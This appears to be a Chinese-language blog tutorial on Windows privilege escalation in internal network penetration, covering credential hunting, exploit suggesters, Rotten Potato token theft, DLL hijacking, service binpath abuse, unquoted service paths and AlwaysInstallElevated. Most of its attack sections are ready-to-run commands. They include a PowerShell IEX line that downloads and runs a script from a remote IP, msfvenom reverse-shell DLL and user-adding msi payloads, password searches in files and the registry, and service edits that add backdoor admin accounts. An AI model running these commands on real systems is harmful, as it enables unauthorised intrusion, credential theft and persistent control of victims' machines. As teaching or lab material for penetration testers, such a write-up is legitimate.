<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>内网渗透之权限提升（Windows篇） | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Windows四种权限：User、Administrator、System、TrustedInstaller，从左到右依次升高 纵向提权：低权限用户获得高权限角色的权限。 横向提权：获得同级别角色的权限。 内核溢出漏洞提权、错误的系统配置提权、数据库提权 利用敏感信息提权自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进">
<meta property="og:type" content="article">
<meta property="og:title" content="内网渗透之权限提升（Windows篇）">
<meta property="og:url" content="https://cjb12.github.io/project/2023/04/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88Windows%E7%AF%87%EF%BC%89/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Windows四种权限：User、Administrator、System、TrustedInstaller，从左到右依次升高 纵向提权：低权限用户获得高权限角色的权限。 横向提权：获得同级别角色的权限。 内核溢出漏洞提权、错误的系统配置提权、数据库提权 利用敏感信息提权自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021723175.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021723812.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021723980.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021723131.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021724137.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021724668.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021724842.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021725610.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021725594.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021725234.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021726263.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021727516.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021728676.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021728708.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021729757.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021729060.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021729647.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021730099.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021730178.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021731409.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021731905.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021731315.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732749.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732832.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732501.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732645.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732443.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021733431.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021733052.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021733183.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021734216.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021734294.png">
<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021734707.png">
<meta property="article:published_time" content="2023-04-16T01:53:14.000Z">
<meta property="article:modified_time" content="2023-10-02T09:34:57.379Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021723175.png">
  
    <link rel="alternate" href="/project/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/project/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/project/css/style.css">

  
    
<link rel="stylesheet" href="/project/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/project/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/project/">Home</a>
        
          <a class="main-nav-link" href="/project/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/project/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://cjb12.github.io/project"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-内网渗透之权限提升（Windows篇）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/project/2023/04/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88Windows%E7%AF%87%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2023-04-16T01:53:14.000Z" itemprop="datePublished">2023-04-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      内网渗透之权限提升（Windows篇）
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Windows四种权限：User、Administrator、System、TrustedInstaller，从左到右依次升高</p>
<p>纵向提权：低权限用户获得高权限角色的权限。</p>
<p>横向提权：获得同级别角色的权限。</p>
<p>内核溢出漏洞提权、错误的系统配置提权、数据库提权</p>
<h2 id="利用敏感信息提权"><a href="#利用敏感信息提权" class="headerlink" title="利用敏感信息提权"></a>利用敏感信息提权</h2><p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。 这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p>
<p>全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Panther\ </span><br><span class="line">C:\Windows\Panther\Unattend\ </span><br><span class="line">C:\Windows\System32\ </span><br><span class="line">C:\Windows\System32\sysprep\</span><br></pre></td></tr></table></figure>

<p>除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user\Desktop&gt; dir C:*vnc.ini /s /b /c</span><br><span class="line"></span><br><span class="line">#Get-ChildItem : 找不到接受实际参数“/b”的位置形式</span><br></pre></td></tr></table></figure>

<p>或者在名称中包含关键词的项目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user\Desktop&gt; dir C:\ /s /b /c | findstr /sr password</span><br><span class="line"></span><br><span class="line">#Get-ChildItem : 找不到接受实际参数“/b”的位置形式</span><br></pre></td></tr></table></figure>

<p>或者可以在文件内容中搜索password之类的关键字：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user\Desktop&gt;findstr /si password *.txt | *.xml | *.ini</span><br></pre></td></tr></table></figure>

<p>可以查询注册表，例如，字符串password：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure>

<p>在这些文件中通常包含用户名和密码，密码使用base64编码，并且在最后会附加”Password”，所以真正的密码需要去掉最后的”Password”。</p>
<h2 id="利用脚本自动查找系统潜在漏洞"><a href="#利用脚本自动查找系统潜在漏洞" class="headerlink" title="利用脚本自动查找系统潜在漏洞"></a>利用脚本自动查找系统潜在漏洞</h2><p><strong>Windows Exploit Suggester</strong></p>
<p>该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而且其只需要我们给出目标系统的信息即可。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
<p>使用如下：</p>
<p>首先更新漏洞数据库，会生成一个xls的文件，如下 2020-08-20-mssb.xls</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 windows-exploit-suggester.py --update</span><br></pre></td></tr></table></figure>

<p>然后执行如下命令，查看目标主机系统信息，保存为sysinfo.txt文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo &gt; sysinfo.txt</span><br></pre></td></tr></table></figure>

<p>最后，运行如下命令，查看该系统是否存在可利用的提权漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 windows-exploit-suggester.py -d 2023-04-12-mssb.xls -i sysinfo.txt</span><br></pre></td></tr></table></figure>

<p><strong>Sherlock脚本</strong></p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
<p>该脚本可以快速的查找出可能用于本地权限提升的漏洞。使用如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/Sherlock.ps1&#x27;);      // 远程执行</span><br><span class="line">Import-Module 目录\Sherlock.ps1        本地执行</span><br><span class="line"></span><br><span class="line">Find-AllVulns    // 调用脚本后，执行搜索命令</span><br></pre></td></tr></table></figure>

<p><strong>local_exploit_suggester 模块</strong></p>
<p>Metasploit内置模块提供了各种可用于提权的local exploits，并会基于架构，平台（即运行的操作系统），会话类型和所需默认选项提供建议。这极大的节省了我们的时间，省去了我们手动搜索local exploits的麻烦。</p>
<p>使用如下，假设我们已经获得了目标主机的一个session：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester </span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><strong>enum_patches 模块</strong></p>
<p>使用metasploit中的post&#x2F;windows&#x2F;gather&#x2F;enum_patches模块可以根据漏洞编号快速找出系统中缺少的补丁。使用如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/enum_patches</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>在实际的查找潜在漏洞的过程中，建议手动和自动双管齐下。</p>
<p><strong>选择漏洞并利用：</strong></p>
<p>漏洞利用程序可以从以下几个地址中下载：（里面附有使用说明）</p>
<ul>
<li>Windows 下的提权大合集：<a target="_blank" rel="noopener" href="https://github.com/lyshark/Windows-exploits">https://github.com/lyshark/Windows-exploits</a></li>
<li>Windows内核溢出漏洞提权大全：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li>
<li>各大平台提权工具：<a target="_blank" rel="noopener" href="https://github.com/klsfct/getshell">https://github.com/klsfct/getshell</a></li>
</ul>
<h2 id="烂土豆配合MSF令牌窃取提权"><a href="#烂土豆配合MSF令牌窃取提权" class="headerlink" title="烂土豆配合MSF令牌窃取提权"></a>烂土豆配合MSF令牌窃取提权</h2><p>简介：烂土豆(Rotten Potato) MS16-075 提权是一个本地提权，只针对本地用户，不支持域用户</p>
<p>适用版本：Windows 7、8、10、2008、2012</p>
<p><strong>提权原理：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</span><br><span class="line">2、对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</span><br><span class="line">3、模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</span><br></pre></td></tr></table></figure>

<p><strong>操作方法：</strong></p>
<p>查看是否具有Selmpersonate权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getprivs</span><br><span class="line"></span><br><span class="line">##或者服务器的cmd下键入以下命令</span><br><span class="line">whoami /all</span><br><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>

<p>如下，SeImpersonatePrivilege是土豆提权的必要条件</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021723175.png" alt="image-20231002172303135"></p>
<p>首先通过msf生成一个msf的木马，通过webshell传上去，然后执行，获取到会话，此时我们使用令牌窃取，会失败，因为此时我们只有web权限，权限太低，无法实现窃取SYSTEM权限，这个时候就需要用到烂土豆配合msf实现权限提升。我们利用webshell把下载好的烂土豆程序传到C盘根目录下，然后执行它，此时我们再通过msf的会话，使用令牌窃取功能即可成功实现从web权限到SYSTEM权限的提升。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">upload /root/potato.exe C:\Users\Public</span><br><span class="line">cd C:\\Users\\Public</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">execute -cH -f ./potato.exe</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure>

<p>烂土豆下载地址：<a target="_blank" rel="noopener" href="https://github.com/foxglovesec/Potato">https://github.com/foxglovesec/Potato</a></p>
<h2 id="Dll劫持提权"><a href="#Dll劫持提权" class="headerlink" title="Dll劫持提权"></a>Dll劫持提权</h2><p>适用版本：<strong>Windows 7、8、10、2008、2012</strong></p>
<p>程序运行一般会加载系统dll或本身程序自带的dll，如果我们将程序执行时需要加载的dll文件替换成木马程序，那么我们下次在启动程序时所加载的dll就是我们替换的那个木马程序了。</p>
<p>攻击过程：收集进程加载的dll-制作dll木马并上传-替换dll-启动应用后成功</p>
<p>收集该软件进程加载的dll 这一步在自己本机上测试，启动应用使用火绒剑分析其模块调用的dll，一般来说我们劫持该应用本身的dll，而不是系统dll，因为系统文件一般我们是更改不了的，所以一般选择未知文件和数字签名文件的dll来进行替换成msf生成的dll</p>
<p>msf生成dll木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.134  lport=6677 -f dll &gt;./payload.dll</span><br></pre></td></tr></table></figure>

<p>然后进行dll替换即可，当管理员运行该程序时即可触发木马，msf即可收到会话。</p>
<h2 id="Windows服务带有易受攻击的权限一"><a href="#Windows服务带有易受攻击的权限一" class="headerlink" title="Windows服务带有易受攻击的权限一"></a>Windows服务带有易受攻击的权限一</h2><p>漏洞原理：由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以通过编辑ImagePath的值，更改该服务的可执行文件路径，使其指向恶意的可执行文件，从而实现权限提升。</p>
<p>该漏洞可以通过使用微软自带的检测工具SubInACL进行检测：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=23510">https://www.microsoft.com/en-us/download/details.aspx?id=23510</a></p>
<p>首先将SubInACL上传到目标机器，然后对相应服务的注册表项进行检测</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021723812.png" alt="image-20231002172327722"></p>
<p>如上图所示，“Everyone”在这个注册表项上有完全的控制权。意味着我们可以通过编辑ImagePath的值，更改该服务的可执行文件路径，使其指向恶意的可执行文件。</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021723980.png" alt="image-20231002172342918"></p>
<p>在下一次启动该服务时，payload.exe将会以SYSTEM权限运行，我们可以通过直接对目标主机执行<code>“shutdown -r -t 0”</code>命令，使其主机重启即可，在此之前我们需要先在kali上启用一个监听，用于接收反弹shell的会话。</p>
<h2 id="Windows服务带有易受攻击的权限二"><a href="#Windows服务带有易受攻击的权限二" class="headerlink" title="Windows服务带有易受攻击的权限二"></a>Windows服务带有易受攻击的权限二</h2><p>漏洞原理：由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以通过编辑BINARY_PATH_NAME参数的值，如果我们将这个值修改成任何命令，那意味着这个命令在该服务下一次启动时，将会以SYSTEM权限运行。如果我们愿意，我们可以添加一个本地管理员，从而实现权限提升。</p>
<p>该漏洞可以通过使用微软自带的检测工具进行检测：</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;username&quot; *          //检测当前用户或者用户组是否有可以修改的服务，根据实际情况修改username</span><br></pre></td></tr></table></figure>

<p>当我们执行以上命令时发现如下图所示的情况，说明此时该提权方法不可行</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021723131.png" alt="image-20231002172357091"> </p>
<p>如果我们对某服务的属性拥有完全控制权。那么我们通过编辑BINARY_PATH_NAME参数的值，将这个值修改成任何命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc config &quot;ServiceName&quot; binpath=&quot;net user eviladmin  P4ssword0 /add&quot;   //添加一个用户 </span><br><span class="line">//在修改了binpath的值后，用“sc stop”和“sc start”命令重启服务：</span><br><span class="line">sc stop &quot;ServiceName&quot;                           //关闭服务</span><br><span class="line">sc start &quot;ServiceName&quot;                           //启动服务</span><br></pre></td></tr></table></figure>

<p>然后我们以同样的方式，再将刚才添加的用户，添加到本地管理员组即可。同样，我们也可以将一个反弹shell载荷上传到目标机器中，并将binpath的值改成载荷的路径。</p>
<p>MSF有现成的漏洞利用模块：exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</p>
<h2 id="Trusted-Service-Paths-提权漏洞"><a href="#Trusted-Service-Paths-提权漏洞" class="headerlink" title="Trusted Service Paths 提权漏洞"></a>Trusted Service Paths 提权漏洞</h2><p>漏洞原理：如果一个服务的可执行文件的路径没有被双引号引起来并且包含空格，那么这个服务就是有漏洞的，该漏洞利用了windows文件路径解析的特性并涉及服务路径的文件&#x2F;文件夹权限配置。</p>
<p><strong>windows文件路径解析的特性：</strong></p>
<p>当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021724137.png" alt="image-20231002172410084"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">路径没有包含在引号中，服务会按照以下顺序依次执行</span><br><span class="line">c:\program.exe</span><br><span class="line">c:\program files.exe</span><br><span class="line">c:\program files (x86)\grasssoft\macro.exe</span><br><span class="line">c:\program files (x86)\grasssoft\macro expert\MacroService.exe</span><br></pre></td></tr></table></figure>

<p>假如存在漏洞路径，我们可以将msf木马放到上面的c:\program.exe、c:\program files.exe、c:\program files (x86)\grasssoft\macro.exe路径下，然后重启机器，此时，反弹回来的shell，就是一个system权限的shell（windows服务通常以System权限运行，所以提供在解析服务所对应的文件路径中的空格时也是以系统权限运行的）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用以下命令查看系统中错误配置的路径</span><br><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>确认目标机器中存在此漏洞后，把要上传的程序重命名并放置在存在此漏洞且可写的目录下，执行如下命令，尝试重启服务。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop &lt;service_name&gt;</span><br><span class="line">sc start &lt;service_name&gt;</span><br></pre></td></tr></table></figure>

<p>既然要重启服务，那么我们就可以知道，该提权方法需要管理员权限，重启服务的方法适用于从管理员权限到system的权限提升过程。而实际情况下，我们直接对目标主机执行<code>“shutdown -r -t 0”</code>命令让他重启就行了。</p>
<p>该提权方法在metasploit中对应的模块为：<code>exploit/windows/local/unquoted_service_path</code>，使用如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/unquoted_service_path</span><br><span class="line">set session 1</span><br><span class="line">set AutoRunScript migrate -f</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>注意：新反弹得到的meterpreter会很快就中断了，这是因为当一个进程在Windows中启动后，必须与服务控制管理进行通信，如果没有通信，服务控制管理器会认为出现了错误，进而终止这个进程。所以，我们要在终止载荷进程之前将它迁移到其他进程中，使用msf的“set AutoRunScript migrate -f”命令即可实现自动迁移进程。</p>
<h2 id="AlwaysInstallElevated提权漏洞"><a href="#AlwaysInstallElevated提权漏洞" class="headerlink" title="AlwaysInstallElevated提权漏洞"></a>AlwaysInstallElevated提权漏洞</h2><p>漏洞原理：用户开启了windows installer特权安装功能。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]</span><br><span class="line">“AlwaysInstallElevated”=dword:00000001 </span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]</span><br><span class="line">“AlwaysInstallElevated”=dword:00000001</span><br></pre></td></tr></table></figure>

<p>那么所有msi（windows应用安装程序）都会以SYSTEM权限运行。此时如果我们执行一个恶意msi程序，即可达到提权目的</p>
<p>同时需要注意的一点是，这个注册表项不一定总是存在的。（比如我的实验机</p>
<p>我们可以通过reg query来验证这两条注册表项的情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>

<p>如果均为1，我们就可以通过msfvenom生成恶意msi来提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi</span><br></pre></td></tr></table></figure>

<p>然后执行这个msi，获得一个管理员账户。</p>
<p>如果两条注册表项的情况不是均为1，可以尝试激活AlwaysInstallElevated，激活它可以通过修改注册表的键值或者在图形化页面上激活。</p>
<p>图形化下激活它的路径为<code>计算机设置\管理模版\windows组件\windows installer</code>，选中已启用即可，该操作需要管理员权限。</p>
<p>通过修改注册表激活它的命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1</span><br><span class="line">reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1</span><br></pre></td></tr></table></figure>

<p>修改注册表的这两项需要有下面两权限：</p>
<ul>
<li>SeRestorePrivilege</li>
<li>SeTakeOwnershipPrivilege</li>
</ul>
<p>使用whoami &#x2F;priv可以查看当前用户的权限。</p>
<h3 id="MSI-Wrapper工具下的利用"><a href="#MSI-Wrapper工具下的利用" class="headerlink" title="MSI Wrapper工具下的利用"></a>MSI Wrapper工具下的利用</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://www.exemsi.com/download/">https://www.exemsi.com/download/</a></p>
<p>MSI Wrapper是一个强大的MSI安装包的生产工具。它有一个友好的图形用户界面，操作简单直观，各种功能齐全，不需要任何知识的脚本可以产生满足要求的Windows安装程序安装程序。</p>
<p>（1）将Payload设置为执行shell.exe(一个msf马)：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021724668.png" alt="image-20231002172445595"></p>
<p>（2）设置为运行时要求提升权限：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021724842.png" alt="image-20231002172456771"></p>
<p>Application Id随便选：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021725610.png" alt="image-20231002172509514"></p>
<p>其他配置按照默认设置即可，最后在你设置的output目录中生成了shell.msi</p>
<p>将生成的shell.msi上传到目标主机中，并开启一个新的msf监听，然后在shell中执行开shell.msi文件:</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021725594.png" alt="image-20231002172521447"></p>
<p>如上图，成功获得system权限。</p>
<p>对于该漏洞，通常情况下，先对注册表项进行判断，如果满足条件(存在两个注册表项)，就可以利用AlwaysInstallElevated提权了</p>
<h2 id="AccessChk使用"><a href="#AccessChk使用" class="headerlink" title="AccessChk使用"></a>AccessChk使用</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p>
